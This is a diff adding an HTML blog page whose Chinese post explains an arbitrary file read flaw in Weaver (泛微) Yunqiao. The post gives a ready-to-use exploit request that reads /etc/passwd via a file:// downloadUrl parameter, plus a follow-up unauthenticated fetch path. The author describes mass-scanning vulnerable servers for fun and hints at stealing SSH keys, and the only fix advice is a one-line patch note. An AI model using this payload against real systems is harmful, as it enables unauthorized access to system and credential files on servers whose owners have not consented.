@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="漏洞复现前的那个梗  这个漏洞是护网的时候爆出来的，相当的简单暴力，利用起来也简单，就一个越权完成了文件读取狠的一批，今晚挺无聊就扫了一批出来玩玩，本来想着放给朋友让他们去漏洞盒子撸点月饼，漏洞盒子今年也看漏洞多的一大堆索性就不让我们来白嫖月饼，改为朋友圈抽奖得月饼。  月饼也没撸到还让帮漏洞盒子在朋友圈打个广告。 利用方式读取任意文件内容 1&#x2F;wxjsapi&#x2F;saveYZJF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="泛微云桥任意读取漏洞">
+<meta property="og:url" content="http://yoursite.com/2020/09/14/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="沫的博客">
+<meta property="og:description" content="漏洞复现前的那个梗  这个漏洞是护网的时候爆出来的，相当的简单暴力，利用起来也简单，就一个越权完成了文件读取狠的一批，今晚挺无聊就扫了一批出来玩玩，本来想着放给朋友让他们去漏洞盒子撸点月饼，漏洞盒子今年也看漏洞多的一大堆索性就不让我们来白嫖月饼，改为朋友圈抽奖得月饼。  月饼也没撸到还让帮漏洞盒子在朋友圈打个广告。 利用方式读取任意文件内容 1&#x2F;wxjsapi&#x2F;saveYZJF">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/images/pasted-190.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-191.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-192.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-193.png">
+<meta property="article:published_time" content="2020-09-14T08:54:23.000Z">
+<meta property="article:modified_time" content="2020-09-14T09:10:47.728Z">
+<meta property="article:author" content="沫">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/images/pasted-190.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/09/14/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>泛微云桥任意读取漏洞 | 沫的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">沫的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/14/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="沫">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="沫的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          泛微云桥任意读取漏洞
+
+<br>
+<span style="font-size:10px;"  title="post.wordcount">
+   字数统计:<span style="color:red;"> 336</span>
+</span>
+<span style="font-size:10px;" title="post.min2read">
+ 个字,阅读时间约:  <span style="color:red;"> 1</span>分钟。
+</span>
+
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-09-14 16:54:23 / 修改时间：17:10:47" itemprop="dateCreated datePublished" datetime="2020-09-14T16:54:23+08:00">2020-09-14</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="漏洞复现前的那个梗"><a href="#漏洞复现前的那个梗" class="headerlink" title="漏洞复现前的那个梗"></a>漏洞复现前的那个梗</h3><p>  这个漏洞是护网的时候爆出来的，相当的简单暴力，利用起来也简单，就一个越权完成了文件读取狠的一批，今晚挺无聊就扫了一批出来玩玩，本来想着放给朋友让他们去漏洞盒子撸点月饼，漏洞盒子今年也看漏洞多的一大堆索性就不让我们来白嫖月饼，改为朋友圈抽奖得月饼。</p>
+<p><img src="/images/pasted-190.png" alt="upload successful"></p>
+<p>月饼也没撸到还让帮漏洞盒子在朋友圈打个广告。</p>
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>读取任意文件内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;wxjsapi&#x2F;saveYZJFile?fileName&#x3D;test&amp;downloadUrl&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&amp;fileExt&#x3D;txt</span><br></pre></td></tr></table></figure>
+<p>把上面这句话丢到url后门，修改一些文件路径就能获取到一个md5加密的值，来看此图，没错打不开，也就是说明这是一台win系统服务器，那就换成win路径就可以，因为漏洞利用比较简单就不多说了</p>
+<p><img src="/images/pasted-191.png" alt="upload successful"><br>正确的打开方式，读取linux系统上所有用户，这个id就是我们需要访问的文件<br><img src="/images/pasted-192.png" alt="upload successful"><br>查看内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x2F;fileNoLogin&#x2F;加上刚刚的id的值</span><br></pre></td></tr></table></figure>
+<p>哈哈哈 文件读取成功，对于平时喜欢ssh密钥登陆的，自己品吧。<br><img src="/images/pasted-193.png" alt="upload successful"></p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>更新最新版本，打最新版的补丁</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/08/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="prev" title="渗透测试---信息收集">
+      <i class="fa fa-chevron-left"></i> 渗透测试---信息收集
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现前的那个梗"><span class="nav-number">1.</span> <span class="nav-text">漏洞复现前的那个梗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用方式"><span class="nav-number">2.</span> <span class="nav-text">利用方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复建议"><span class="nav-number">3.</span> <span class="nav-text">修复建议</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="沫"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">沫</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">沫</span>
+</div>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
